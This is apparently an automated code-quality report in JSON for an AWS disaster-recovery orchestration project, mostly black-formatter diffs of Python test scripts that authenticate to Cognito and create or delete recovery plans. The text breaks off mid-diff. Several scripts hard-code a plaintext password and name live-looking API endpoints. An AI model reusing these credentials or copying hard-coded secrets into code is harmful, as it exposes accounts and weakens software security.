{
  "metadata": {
    "generated_at": "2026-01-02T10:49:02.736027",
    "generator": "AWS DRS Orchestration Quality Reporter",
    "version": "1.0.0"
  },
  "summary": {
    "total_files_analyzed": 53,
    "tools_run": 3,
    "tools_passed": 0,
    "tool_compliance_percentage": 0.0,
    "flake8_violations": 0,
    "overall_status": "FAILED",
    "timestamp": "2026-01-02T10:49:02.736027",
    "files_analyzed": [
      "lambda/drs_tag_sync.py",
      "lambda/deploy_lambda.py",
      "lambda/index.py",
      "lambda/execution_registry.py",
      "lambda/build_and_deploy.py",
      "lambda/tag_discovery.py",
      "lambda/rbac_middleware.py",
      "lambda/orchestration_stepfunctions.py",
      "scripts/generate_quality_report.py",
      "scripts/monitor_lambda_drill.py",
      "scripts/manage-user-roles.py",
      "scripts/add-current-account.py",
      "scripts/test_drs_drill_trace.py",
      "tests/python/monitor_execution.py",
      "tests/python/conftest.py",
      "tests/python/create_test_plan.py",
      "tests/python/create_test_ui.py",
      "tests/python/test_drs_validation.py",
      "tests/python/create_real_test_data.py",
      "tests/python/monitor_drs_drill.py",
      "tests/python/validate_setup.py",
      "tests/python/cleanup_all_data.py",
      "tests/python/standalone_drs_drill.py",
      "tests/python/automated_e2e_test.py",
      "tests/python/test_with_lambda_invoke.py",
      "tests/python/check_pg_response.py",
      "tests/security/validate_framework.py",
      "tests/security/rbac_security_tests.py",
      "tests/security/demo_security_test.py",
      "tests/security/run_security_tests.py",
      "tests/security/run_existing_user_tests.py",
      "tests/python/mocks/__init__.py",
      "tests/python/mocks/mock_drs_client.py",
      "tests/python/unit/test_data_generator.py",
      "tests/python/unit/__init__.py",
      "tests/python/unit/test_drs_service_limits.py",
      "tests/python/unit/test_infrastructure_smoke.py",
      "tests/python/unit/test_wave_transformation.py",
      "tests/python/unit/test_fixtures.py",
      "tests/python/unit/test_mock_drs_client.py",
      "tests/python/unit/test_recovery_plan_delete.py",
      "tests/python/integration/__init__.py",
      "tests/python/utils/test_data_generator.py",
      "tests/python/utils/__init__.py",
      "tests/python/fixtures/__init__.py",
      "tests/python/fixtures/recovery_plan_fixtures.py",
      "tests/python/e2e/test_recovery_plan_bugs.py",
      "tests/python/e2e/test_protection_group_crud.py",
      "tests/python/e2e/test_recovery_plan_e2e.py",
      "tests/python/e2e/__init__.py",
      "tests/python/e2e/get_auth_token.py",
      "tests/python/e2e/test_recovery_plan_api_crud.py",
      "tests/python/e2e/test_protection_groups_fix.py"
    ]
  },
  "tool_results": {
    "black": {
      "tool": "black",
      "status": "failed",
      "files_checked": 53,
      "files_needing_format": "unknown",
      "output": "\u001b[1m--- tests/python/check_pg_response.py\t2025-11-21 02:56:07.791804+00:00\u001b[0m\n\u001b[1m+++ tests/python/check_pg_response.py\t2026-01-02 15:49:03.300912+00:00\u001b[0m\n\u001b[36m@@ -9,19 +9,19 @@\u001b[0m\n REGION = \"us-east-1\"\n USERNAME = \"testuser@example.com\"\n PASSWORD = \"IiG2b1o+D$\"\n \n print(\"\ud83d\udd10 Authenticating...\")\n\u001b[31m-client = boto3.client('cognito-idp', region_name=REGION)\u001b[0m\n\u001b[32m+client = boto3.client(\"cognito-idp\", region_name=REGION)\u001b[0m\n response = client.initiate_auth(\n     ClientId=USER_POOL_CLIENT_ID,\n\u001b[31m-    AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[31m-    AuthParameters={'USERNAME': USERNAME, 'PASSWORD': PASSWORD}\u001b[0m\n\u001b[32m+    AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n\u001b[32m+    AuthParameters={\"USERNAME\": USERNAME, \"PASSWORD\": PASSWORD},\u001b[0m\n )\n\u001b[31m-token = response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[31m-headers = {'Authorization': f'Bearer {token}'}\u001b[0m\n\u001b[32m+token = response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n\u001b[32m+headers = {\"Authorization\": f\"Bearer {token}\"}\u001b[0m\n \n print(\"\\n\ud83d\udce6 Fetching Protection Groups...\")\n\u001b[31m-r = requests.get(f'{API_ENDPOINT}/protection-groups', headers=headers)\u001b[0m\n\u001b[32m+r = requests.get(f\"{API_ENDPOINT}/protection-groups\", headers=headers)\u001b[0m\n print(f\"\\nStatus: {r.status_code}\")\n print(f\"\\nResponse JSON:\")\n print(json.dumps(r.json(), indent=2))\n\u001b[1m--- tests/python/cleanup_all_data.py\t2025-11-21 02:56:07.792066+00:00\u001b[0m\n\u001b[1m+++ tests/python/cleanup_all_data.py\t2026-01-02 15:49:03.321339+00:00\u001b[0m\n\u001b[36m@@ -12,43 +12,52 @@\u001b[0m\n REGION = \"us-east-1\"\n USERNAME = \"testuser@example.com\"\n PASSWORD = \"IiG2b1o+D$\"\n \n print(\"\ud83d\udd10 Authenticating...\")\n\u001b[31m-client = boto3.client('cognito-idp', region_name=REGION)\u001b[0m\n\u001b[32m+client = boto3.client(\"cognito-idp\", region_name=REGION)\u001b[0m\n response = client.initiate_auth(\n     ClientId=USER_POOL_CLIENT_ID,\n\u001b[31m-    AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[31m-    AuthParameters={'USERNAME': USERNAME, 'PASSWORD': PASSWORD}\u001b[0m\n\u001b[32m+    AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n\u001b[32m+    AuthParameters={\"USERNAME\": USERNAME, \"PASSWORD\": PASSWORD},\u001b[0m\n )\n\u001b[31m-token = response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[31m-headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}\u001b[0m\n\u001b[32m+token = response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n\u001b[32m+headers = {\u001b[0m\n\u001b[32m+    \"Authorization\": f\"Bearer {token}\",\u001b[0m\n\u001b[32m+    \"Content-Type\": \"application/json\",\u001b[0m\n\u001b[32m+}\u001b[0m\n \n print(\"\\n\ud83d\uddd1\ufe0f  Deleting all Recovery Plans...\")\n\u001b[31m-r = requests.get(f'{API_ENDPOINT}/recovery-plans', headers=headers)\u001b[0m\n\u001b[31m-plans = r.json().get('plans', [])\u001b[0m\n\u001b[32m+r = requests.get(f\"{API_ENDPOINT}/recovery-plans\", headers=headers)\u001b[0m\n\u001b[32m+plans = r.json().get(\"plans\", [])\u001b[0m\n print(f\"Found {len(plans)} Recovery Plans\")\n for plan in plans:\n\u001b[31m-    plan_id = plan.get('recoveryPlanId') or plan.get('PlanId')\u001b[0m\n\u001b[31m-    plan_name = plan.get('recoveryPlanName') or plan.get('PlanName', 'Unknown')\u001b[0m\n\u001b[32m+    plan_id = plan.get(\"recoveryPlanId\") or plan.get(\"PlanId\")\u001b[0m\n\u001b[32m+    plan_name = plan.get(\"recoveryPlanName\") or plan.get(\"PlanName\", \"Unknown\")\u001b[0m\n     if plan_id:\n         print(f\"  Deleting: {plan_name} ({plan_id})\")\n\u001b[31m-        requests.delete(f'{API_ENDPOINT}/recovery-plans/{plan_id}', headers=headers)\u001b[0m\n\u001b[32m+        requests.delete(\u001b[0m\n\u001b[32m+            f\"{API_ENDPOINT}/recovery-plans/{plan_id}\", headers=headers\u001b[0m\n\u001b[32m+        )\u001b[0m\n \n print(\"\\n\ud83d\uddd1\ufe0f  Deleting all Protection Groups...\")\n\u001b[31m-r = requests.get(f'{API_ENDPOINT}/protection-groups', headers=headers)\u001b[0m\n\u001b[31m-groups = r.json().get('groups', [])\u001b[0m\n\u001b[32m+r = requests.get(f\"{API_ENDPOINT}/protection-groups\", headers=headers)\u001b[0m\n\u001b[32m+groups = r.json().get(\"groups\", [])\u001b[0m\n print(f\"Found {len(groups)} Protection Groups\")\n for pg in groups:\n\u001b[31m-    pg_id = pg['protectionGroupId']\u001b[0m\n\u001b[31m-    pg_name = pg['name']\u001b[0m\n\u001b[32m+    pg_id = pg[\"protectionGroupId\"]\u001b[0m\n\u001b[32m+    pg_name = pg[\"name\"]\u001b[0m\n     print(f\"  Deleting: {pg_name} ({pg_id})\")\n\u001b[31m-    requests.delete(f'{API_ENDPOINT}/protection-groups/{pg_id}', headers=headers)\u001b[0m\n\u001b[32m+    requests.delete(\u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/protection-groups/{pg_id}\", headers=headers\u001b[0m\n\u001b[32m+    )\u001b[0m\n \n print(\"\\n\u2705 All data cleaned up!\")\n print(\"\\n\ud83d\udccb Ready for manual UI testing:\")\n\u001b[31m-print(\"   1. Navigate to: https://d1wfyuosowt0hl.cloudfront.net/recovery-plans\")\u001b[0m\n\u001b[32m+print(\u001b[0m\n\u001b[32m+    \"   1. Navigate to: https://d1wfyuosowt0hl.cloudfront.net/recovery-plans\"\u001b[0m\n\u001b[32m+)\u001b[0m\n print(\"   2. First create 3 Protection Groups:\")\n print(\"      - WebServers (2 DRS servers)\")\n\u001b[31m-print(\"      - AppServers (4 DRS servers)\")  \u001b[0m\n\u001b[32m+print(\"      - AppServers (4 DRS servers)\")\u001b[0m\n print(\"      - DatabaseServers (2 DRS servers)\")\n print(\"   3. Then create TEST Recovery Plan with 3 waves as specified\")\n\u001b[1m--- tests/python/conftest.py\t2025-11-19 22:53:08.154386+00:00\u001b[0m\n\u001b[1m+++ tests/python/conftest.py\t2026-01-02 15:49:03.349141+00:00\u001b[0m\n\u001b[36m@@ -10,29 +10,33 @@\u001b[0m\n \n # ============================================================================\n # Environment Setup\n # ============================================================================\n \n\u001b[32m+\u001b[0m\n @pytest.fixture(scope=\"session\", autouse=True)\n def setup_test_environment():\n     \"\"\"Set up test environment variables.\"\"\"\n     os.environ[\"AWS_DEFAULT_REGION\"] = \"us-east-1\"\n     os.environ[\"AWS_ACCESS_KEY_ID\"] = \"testing\"\n     os.environ[\"AWS_SECRET_ACCESS_KEY\"] = \"testing\"\n     os.environ[\"AWS_SECURITY_TOKEN\"] = \"testing\"\n     os.environ[\"AWS_SESSION_TOKEN\"] = \"testing\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # DynamoDB table names for testing\n     os.environ[\"PROTECTION_GROUPS_TABLE\"] = \"protection-groups-test\"\n     os.environ[\"RECOVERY_PLANS_TABLE\"] = \"recovery-plans-test\"\n     os.environ[\"EXECUTION_HISTORY_TABLE\"] = \"execution-history-test\"\n\u001b[31m-    os.environ[\"STATE_MACHINE_ARN\"] = \"arn:aws:states:us-east-1:123456789012:stateMachine:test-state-machine\"\u001b[0m\n\u001b[32m+    os.environ[\u001b[0m\n\u001b[32m+        \"STATE_MACHINE_ARN\"\u001b[0m\n\u001b[32m+    ] = \"arn:aws:states:us-east-1:123456789012:stateMachine:test-state-machine\"\u001b[0m\n \n \n # ============================================================================\n # AWS Service Mocks\n # ============================================================================\n\u001b[32m+\u001b[0m\n \n @pytest.fixture\n def aws_credentials():\n     \"\"\"Mocked AWS Credentials for moto.\"\"\"\n     os.environ[\"AWS_ACCESS_KEY_ID\"] = \"testing\"\n\u001b[36m@@ -71,50 +75,58 @@\u001b[0m\n \n # ============================================================================\n # DynamoDB Table Fixtures\n # ============================================================================\n \n\u001b[32m+\u001b[0m\n @pytest.fixture\n def protection_groups_table(dynamodb_mock):\n     \"\"\"Create mock Protection Groups DynamoDB table.\"\"\"\n     table = dynamodb_mock.create_table(\n         TableName=\"protection-groups-test\",\n         KeySchema=[{\"AttributeName\": \"GroupId\", \"KeyType\": \"HASH\"}],\n\u001b[31m-        AttributeDefinitions=[{\"AttributeName\": \"GroupId\", \"AttributeType\": \"S\"}],\u001b[0m\n\u001b[31m-        BillingMode=\"PAY_PER_REQUEST\"\u001b[0m\n\u001b[32m+        AttributeDefinitions=[\u001b[0m\n\u001b[32m+            {\"AttributeName\": \"GroupId\", \"AttributeType\": \"S\"}\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+        BillingMode=\"PAY_PER_REQUEST\",\u001b[0m\n     )\n     return table\n \n \n @pytest.fixture\n def recovery_plans_table(dynamodb_mock):\n     \"\"\"Create mock Recovery Plans DynamoDB table.\"\"\"\n     table = dynamodb_mock.create_table(\n         TableName=\"recovery-plans-test\",\n         KeySchema=[{\"AttributeName\": \"PlanId\", \"KeyType\": \"HASH\"}],\n\u001b[31m-        AttributeDefinitions=[{\"AttributeName\": \"PlanId\", \"AttributeType\": \"S\"}],\u001b[0m\n\u001b[31m-        BillingMode=\"PAY_PER_REQUEST\"\u001b[0m\n\u001b[32m+        AttributeDefinitions=[\u001b[0m\n\u001b[32m+            {\"AttributeName\": \"PlanId\", \"AttributeType\": \"S\"}\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+        BillingMode=\"PAY_PER_REQUEST\",\u001b[0m\n     )\n     return table\n \n \n @pytest.fixture\n def execution_history_table(dynamodb_mock):\n     \"\"\"Create mock Execution History DynamoDB table.\"\"\"\n     table = dynamodb_mock.create_table(\n         TableName=\"execution-history-test\",\n         KeySchema=[{\"AttributeName\": \"ExecutionId\", \"KeyType\": \"HASH\"}],\n\u001b[31m-        AttributeDefinitions=[{\"AttributeName\": \"ExecutionId\", \"AttributeType\": \"S\"}],\u001b[0m\n\u001b[31m-        BillingMode=\"PAY_PER_REQUEST\"\u001b[0m\n\u001b[32m+        AttributeDefinitions=[\u001b[0m\n\u001b[32m+            {\"AttributeName\": \"ExecutionId\", \"AttributeType\": \"S\"}\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+        BillingMode=\"PAY_PER_REQUEST\",\u001b[0m\n     )\n     return table\n \n \n # ============================================================================\n # Test Data Cleanup\n # ============================================================================\n \n\u001b[32m+\u001b[0m\n @pytest.fixture(autouse=True)\n def cleanup_after_test():\n     \"\"\"Cleanup test data after each test.\"\"\"\n     yield\n     # Cleanup happens automatically with moto mocks\n\u001b[1m--- tests/python/create_real_test_data.py\t2025-11-21 02:56:07.792342+00:00\u001b[0m\n\u001b[1m+++ tests/python/create_real_test_data.py\t2026-01-02 15:49:03.362889+00:00\u001b[0m\n\u001b[36m@@ -20,100 +20,117 @@\u001b[0m\n     \"s-3b9401c1cd270a7a8\",  # EC2AMAZ-3B0B3UD\n ]\n \n # Get auth token\n print(\"\ud83d\udd10 Authenticating...\")\n\u001b[31m-cognito = boto3.client('cognito-idp', region_name='us-east-1')\u001b[0m\n\u001b[32m+cognito = boto3.client(\"cognito-idp\", region_name=\"us-east-1\")\u001b[0m\n response = cognito.initiate_auth(\n\u001b[31m-    AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[31m-    AuthParameters={'USERNAME': USERNAME, 'PASSWORD': PASSWORD},\u001b[0m\n\u001b[31m-    ClientId=CLIENT_ID\u001b[0m\n\u001b[32m+    AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n\u001b[32m+    AuthParameters={\"USERNAME\": USERNAME, \"PASSWORD\": PASSWORD},\u001b[0m\n\u001b[32m+    ClientId=CLIENT_ID,\u001b[0m\n )\n\u001b[31m-token = response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[31m-headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}\u001b[0m\n\u001b[32m+token = response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n\u001b[32m+headers = {\u001b[0m\n\u001b[32m+    \"Authorization\": f\"Bearer {token}\",\u001b[0m\n\u001b[32m+    \"Content-Type\": \"application/json\",\u001b[0m\n\u001b[32m+}\u001b[0m\n \n # Clean up existing TEST data\n print(\"\\n\ud83e\uddf9 Cleaning up old test data...\")\n\u001b[31m-r = requests.get(f'{API_ENDPOINT}/recovery-plans', headers=headers)\u001b[0m\n\u001b[31m-for plan in r.json().get('plans', []):\u001b[0m\n\u001b[31m-    if plan.get('name') == 'TEST':\u001b[0m\n\u001b[31m-        plan_id = plan.get('recoveryPlanId') or plan.get('planId') or plan.get('id')\u001b[0m\n\u001b[32m+r = requests.get(f\"{API_ENDPOINT}/recovery-plans\", headers=headers)\u001b[0m\n\u001b[32m+for plan in r.json().get(\"plans\", []):\u001b[0m\n\u001b[32m+    if plan.get(\"name\") == \"TEST\":\u001b[0m\n\u001b[32m+        plan_id = (\u001b[0m\n\u001b[32m+            plan.get(\"recoveryPlanId\") or plan.get(\"planId\") or plan.get(\"id\")\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print(f\"  Deleting old TEST plan: {plan_id}\")\n\u001b[31m-        requests.delete(f'{API_ENDPOINT}/recovery-plans/{plan_id}', headers=headers)\u001b[0m\n\u001b[32m+        requests.delete(\u001b[0m\n\u001b[32m+            f\"{API_ENDPOINT}/recovery-plans/{plan_id}\", headers=headers\u001b[0m\n\u001b[32m+        )\u001b[0m\n \n\u001b[31m-r = requests.get(f'{API_ENDPOINT}/protection-groups', headers=headers)\u001b[0m\n\u001b[31m-for pg in r.json().get('groups', []):\u001b[0m\n\u001b[31m-    if pg.get('name') in ['WebServers', 'AppServers', 'DatabaseServers']:\u001b[0m\n\u001b[31m-        pg_id = pg.get('protectionGroupId') or pg.get('groupId') or pg.get('id')\u001b[0m\n\u001b[32m+r = requests.get(f\"{API_ENDPOINT}/protection-groups\", headers=headers)\u001b[0m\n\u001b[32m+for pg in r.json().get(\"groups\", []):\u001b[0m\n\u001b[32m+    if pg.get(\"name\") in [\"WebServers\", \"AppServers\", \"DatabaseServers\"]:\u001b[0m\n\u001b[32m+        pg_id = (\u001b[0m\n\u001b[32m+            pg.get(\"protectionGroupId\") or pg.get(\"groupId\") or pg.get(\"id\")\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print(f\"  Deleting old PG: {pg.get('name')} ({pg_id})\")\n\u001b[31m-        requests.delete(f'{API_ENDPOINT}/protection-groups/{pg_id}', headers=headers)\u001b[0m\n\u001b[32m+        requests.delete(\u001b[0m\n\u001b[32m+            f\"{API_ENDPOINT}/protection-groups/{pg_id}\", headers=headers\u001b[0m\n\u001b[32m+        )\u001b[0m\n \n # Create Protection Groups with REAL servers\n print(\"\\n\ud83d\udce6 Creating Protection Groups with REAL DRS servers...\")\n pg_data = {\n\u001b[31m-    'WebServers': REAL_SERVERS[:2],      # First 2 servers\u001b[0m\n\u001b[31m-    'AppServers': REAL_SERVERS[2:4],     # Next 2 servers  \u001b[0m\n\u001b[31m-    'DatabaseServers': REAL_SERVERS[4:]  # Last 2 servers\u001b[0m\n\u001b[32m+    \"WebServers\": REAL_SERVERS[:2],  # First 2 servers\u001b[0m\n\u001b[32m+    \"AppServers\": REAL_SERVERS[2:4],  # Next 2 servers\u001b[0m\n\u001b[32m+    \"DatabaseServers\": REAL_SERVERS[4:],  # Last 2 servers\u001b[0m\n }\n \n pg_map = {}\n for name, server_ids in pg_data.items():\n     payload = {\n         \"GroupName\": name,\n         \"Region\": \"us-east-1\",\n         \"Description\": f\"UI test - REAL DRS servers - {name}\",\n         \"AccountId\": \"123456789012\",\n\u001b[31m-        \"sourceServerIds\": server_ids\u001b[0m\n\u001b[32m+        \"sourceServerIds\": server_ids,\u001b[0m\n     }\n\u001b[31m-    r = requests.post(f'{API_ENDPOINT}/protection-groups', headers=headers, json=payload)\u001b[0m\n\u001b[32m+    r = requests.post(\u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/protection-groups\", headers=headers, json=payload\u001b[0m\n\u001b[32m+    )\u001b[0m\n     if r.status_code != 201:\n         print(f\"\u274c Error creating {name}: {r.status_code} - {r.text}\")\n         continue\n     pg = r.json()\n\u001b[31m-    pg_id = pg.get('protectionGroupId')\u001b[0m\n\u001b[31m-    pg_map[name] = {'id': pg_id, 'servers': server_ids}\u001b[0m\n\u001b[32m+    pg_id = pg.get(\"protectionGroupId\")\u001b[0m\n\u001b[32m+    pg_map[name] = {\"id\": pg_id, \"servers\": server_ids}\u001b[0m\n     print(f\"  \u2713 {name}: {pg_id} ({len(server_ids)} real DRS servers)\")\n \n # Create Recovery Plan with 3 waves\n print(\"\\n\ud83d\ude80 Creating 'TEST' Recovery Plan with 3 waves...\")\n waves = [\n     {\n         \"waveNumber\": 1,\n         \"WaveName\": \"WebTier\",\n\u001b[31m-        \"ProtectionGroupId\": pg_map['WebServers']['id'],\u001b[0m\n\u001b[31m-        \"ServerIds\": pg_map['WebServers']['servers']\u001b[0m\n\u001b[32m+        \"ProtectionGroupId\": pg_map[\"WebServers\"][\"id\"],\u001b[0m\n\u001b[32m+        \"ServerIds\": pg_map[\"WebServers\"][\"servers\"],\u001b[0m\n     },\n     {\n         \"waveNumber\": 2,\n         \"WaveName\": \"AppTier\",\n\u001b[31m-        \"ProtectionGroupId\": pg_map['AppServers']['id'],\u001b[0m\n\u001b[31m-        \"ServerIds\": pg_map['AppServers']['servers']\u001b[0m\n\u001b[32m+        \"ProtectionGroupId\": pg_map[\"AppServers\"][\"id\"],\u001b[0m\n\u001b[32m+        \"ServerIds\": pg_map[\"AppServers\"][\"servers\"],\u001b[0m\n     },\n     {\n         \"waveNumber\": 3,\n         \"WaveName\": \"DatabaseTier\",\n\u001b[31m-        \"ProtectionGroupId\": pg_map['DatabaseServers']['id'],\u001b[0m\n\u001b[31m-        \"ServerIds\": pg_map['DatabaseServers']['servers']\u001b[0m\n\u001b[31m-    }\u001b[0m\n\u001b[32m+        \"ProtectionGroupId\": pg_map[\"DatabaseServers\"][\"id\"],\u001b[0m\n\u001b[32m+        \"ServerIds\": pg_map[\"DatabaseServers\"][\"servers\"],\u001b[0m\n\u001b[32m+    },\u001b[0m\n ]\n \n payload = {\n     \"PlanName\": \"TEST\",\n     \"Description\": \"UI test - 3 waves with REAL DRS servers\",\n\u001b[31m-    \"Waves\": waves\u001b[0m\n\u001b[32m+    \"Waves\": waves,\u001b[0m\n }\n \n\u001b[31m-r = requests.post(f'{API_ENDPOINT}/recovery-plans', headers=headers, json=payload)\u001b[0m\n\u001b[32m+r = requests.post(\u001b[0m\n\u001b[32m+    f\"{API_ENDPOINT}/recovery-plans\", headers=headers, json=payload\u001b[0m\n\u001b[32m+)\u001b[0m\n if r.status_code != 201:\n     print(f\"\u274c Error: {r.status_code} - {r.text}\")\n     exit(1)\n \n plan = r.json()\n\u001b[31m-plan_id = plan.get('recoveryPlanId') or plan.get('planId') or plan.get('id')\u001b[0m\n\u001b[32m+plan_id = plan.get(\"recoveryPlanId\") or plan.get(\"planId\") or plan.get(\"id\")\u001b[0m\n \n print(f\"\\n\u2705 SUCCESS! TEST Recovery Plan created with REAL data\")\n print(f\"   Plan ID: {plan_id}\")\n\u001b[31m-print(f\"   3 Protection Groups: WebServers (2), AppServers (2), DatabaseServers (2)\")\u001b[0m\n\u001b[32m+print(\u001b[0m\n\u001b[32m+    f\"   3 Protection Groups: WebServers (2), AppServers (2), DatabaseServers (2)\"\u001b[0m\n\u001b[32m+)\u001b[0m\n print(f\"   3 Waves: WebTier \u2192 AppTier \u2192 DatabaseTier\")\n print(f\"\\n\ud83c\udf10 View in UI: https://d1wfyuosowt0hl.cloudfront.net/recovery-plans\")\n print(f\"\\n\u2713 All data uses REAL DRS servers from us-east-1\")\n print(f\"\u2713 Servers are in CONTINUOUS replication state\")\n\u001b[1m--- tests/python/create_test_plan.py\t2025-11-21 02:56:07.792642+00:00\u001b[0m\n\u001b[1m+++ tests/python/create_test_plan.py\t2026-01-02 15:49:03.364405+00:00\u001b[0m\n\u001b[36m@@ -6,104 +6,127 @@\u001b[0m\n import json\n import os\n from dotenv import load_dotenv\n \n # Load environment\n\u001b[31m-load_dotenv('.env.test')\u001b[0m\n\u001b[32m+load_dotenv(\".env.test\")\u001b[0m\n \n\u001b[31m-API_URL = os.getenv('API_URL', 'https://9cowuz4azi.execute-api.us-east-1.amazonaws.com/test')\u001b[0m\n\u001b[31m-TOKEN = os.getenv('COGNITO_TOKEN')\u001b[0m\n\u001b[32m+API_URL = os.getenv(\u001b[0m\n\u001b[32m+    \"API_URL\", \"https://9cowuz4azi.execute-api.us-east-1.amazonaws.com/test\"\u001b[0m\n\u001b[32m+)\u001b[0m\n\u001b[32m+TOKEN = os.getenv(\"COGNITO_TOKEN\")\u001b[0m\n \n headers = {\n\u001b[31m-    'Authorization': f'Bearer {TOKEN}',\u001b[0m\n\u001b[31m-    'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+    \"Authorization\": f\"Bearer {TOKEN}\",\u001b[0m\n\u001b[32m+    \"Content-Type\": \"application/json\",\u001b[0m\n }\n \n print(\"\ud83d\udd0d Step 1: Getting Protection Groups...\")\n\u001b[31m-response = requests.get(f'{API_URL}/protection-groups', headers=headers)\u001b[0m\n\u001b[32m+response = requests.get(f\"{API_URL}/protection-groups\", headers=headers)\u001b[0m\n response.raise_for_status()\n pgs = response.json()\n \n # Find target PGs\n pg_map = {}\n for pg in pgs:\n\u001b[31m-    if pg['name'] in ['WebServers', 'AppServers', 'DatabaseServers']:\u001b[0m\n\u001b[31m-        pg_map[pg['name']] = pg['id']\u001b[0m\n\u001b[32m+    if pg[\"name\"] in [\"WebServers\", \"AppServers\", \"DatabaseServers\"]:\u001b[0m\n\u001b[32m+        pg_map[pg[\"name\"]] = pg[\"id\"]\u001b[0m\n         print(f\"  \u2713 {pg['name']}: {pg['id']}\")\n \n if len(pg_map) != 3:\n\u001b[31m-    print(f\"\u274c Error: Need all 3 Protection Groups. Found: {list(pg_map.keys())}\")\u001b[0m\n\u001b[32m+    print(\u001b[0m\n\u001b[32m+        f\"\u274c Error: Need all 3 Protection Groups. Found: {list(pg_map.keys())}\"\u001b[0m\n\u001b[32m+    )\u001b[0m\n     exit(1)\n \n print(\"\\n\ud83d\udd0d Step 2: Getting servers from each Protection Group...\")\n waves_data = []\n \n # Wave 1: Web - Select 2 servers from WebServers\n\u001b[31m-response = requests.get(f'{API_URL}/protection-groups/{pg_map[\"WebServers\"]}/servers', headers=headers)\u001b[0m\n\u001b[32m+response = requests.get(\u001b[0m\n\u001b[32m+    f'{API_URL}/protection-groups/{pg_map[\"WebServers\"]}/servers',\u001b[0m\n\u001b[32m+    headers=headers,\u001b[0m\n\u001b[32m+)\u001b[0m\n response.raise_for_status()\n web_servers = response.json()\n\u001b[31m-selected_web = [s['serverId'] for s in web_servers[:2]]\u001b[0m\n\u001b[32m+selected_web = [s[\"serverId\"] for s in web_servers[:2]]\u001b[0m\n print(f\"  \u2713 WebServers: Selected 2 of {len(web_servers)} servers\")\n print(f\"    Server IDs: {selected_web}\")\n \n\u001b[31m-waves_data.append({\u001b[0m\n\u001b[31m-    \"WaveName\": \"Web\",\u001b[0m\n\u001b[31m-    \"ProtectionGroupId\": pg_map[\"WebServers\"],\u001b[0m\n\u001b[31m-    \"ServerIds\": selected_web\u001b[0m\n\u001b[31m-})\u001b[0m\n\u001b[32m+waves_data.append(\u001b[0m\n\u001b[32m+    {\u001b[0m\n\u001b[32m+        \"WaveName\": \"Web\",\u001b[0m\n\u001b[32m+        \"ProtectionGroupId\": pg_map[\"WebServers\"],\u001b[0m\n\u001b[32m+        \"ServerIds\": selected_web,\u001b[0m\n\u001b[32m+    }\u001b[0m\n\u001b[32m+)\u001b[0m\n \n # Wave 2: App - Select 2 of 4 servers from AppServers\n\u001b[31m-response = requests.get(f'{API_URL}/protection-groups/{pg_map[\"AppServers\"]}/servers', headers=headers)\u001b[0m\n\u001b[32m+response = requests.get(\u001b[0m\n\u001b[32m+    f'{API_URL}/protection-groups/{pg_map[\"AppServers\"]}/servers',\u001b[0m\n\u001b[32m+    headers=headers,\u001b[0m\n\u001b[32m+)\u001b[0m\n response.raise_for_status()\n app_servers = response.json()\n\u001b[31m-selected_app = [s['serverId'] for s in app_servers[:2]]\u001b[0m\n\u001b[32m+selected_app = [s[\"serverId\"] for s in app_servers[:2]]\u001b[0m\n print(f\"  \u2713 AppServers: Selected 2 of {len(app_servers)} servers\")\n print(f\"    Server IDs: {selected_app}\")\n \n\u001b[31m-waves_data.append({\u001b[0m\n\u001b[31m-    \"WaveName\": \"App\",\u001b[0m\n\u001b[31m-    \"ProtectionGroupId\": pg_map[\"AppServers\"],\u001b[0m\n\u001b[31m-    \"ServerIds\": selected_app\u001b[0m\n\u001b[31m-})\u001b[0m\n\u001b[32m+waves_data.append(\u001b[0m\n\u001b[32m+    {\u001b[0m\n\u001b[32m+        \"WaveName\": \"App\",\u001b[0m\n\u001b[32m+        \"ProtectionGroupId\": pg_map[\"AppServers\"],\u001b[0m\n\u001b[32m+        \"ServerIds\": selected_app,\u001b[0m\n\u001b[32m+    }\u001b[0m\n\u001b[32m+)\u001b[0m\n \n # Wave 3: Database - Select last 2 servers from DatabaseServers\n\u001b[31m-response = requests.get(f'{API_URL}/protection-groups/{pg_map[\"DatabaseServers\"]}/servers', headers=headers)\u001b[0m\n\u001b[32m+response = requests.get(\u001b[0m\n\u001b[32m+    f'{API_URL}/protection-groups/{pg_map[\"DatabaseServers\"]}/servers',\u001b[0m\n\u001b[32m+    headers=headers,\u001b[0m\n\u001b[32m+)\u001b[0m\n response.raise_for_status()\n db_servers = response.json()\n\u001b[31m-selected_db = [s['serverId'] for s in db_servers[-2:]] if len(db_servers) >= 2 else [s['serverId'] for s in db_servers]\u001b[0m\n\u001b[32m+selected_db = (\u001b[0m\n\u001b[32m+    [s[\"serverId\"] for s in db_servers[-2:]]\u001b[0m\n\u001b[32m+    if len(db_servers) >= 2\u001b[0m\n\u001b[32m+    else [s[\"serverId\"] for s in db_servers]\u001b[0m\n\u001b[32m+)\u001b[0m\n print(f\"  \u2713 DatabaseServers: Selected last 2 of {len(db_servers)} servers\")\n print(f\"    Server IDs: {selected_db}\")\n \n\u001b[31m-waves_data.append({\u001b[0m\n\u001b[31m-    \"WaveName\": \"Database\",\u001b[0m\n\u001b[31m-    \"ProtectionGroupId\": pg_map[\"DatabaseServers\"],\u001b[0m\n\u001b[31m-    \"ServerIds\": 